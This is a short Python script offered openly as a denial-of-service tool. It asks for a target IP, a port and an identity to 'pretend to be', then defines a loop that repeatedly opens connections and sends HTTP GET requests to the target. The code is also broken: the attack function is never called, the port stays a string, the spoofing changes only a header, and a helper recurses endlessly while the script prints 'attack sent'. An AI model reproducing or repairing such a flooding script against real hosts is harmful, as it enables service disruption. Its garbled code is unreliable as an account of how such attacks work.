import socket
import timeit

def for_loop():
    for number in range(999) :
        for_loop()

target = input("put the target ip here so we can attack them : ")
port = input("what port do you wanna attack : ")
fake_ip = input("who do we wanna pretend to be while attacking : ")

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(999):
    print("attack sent")

timeit.timeit(for_loop)
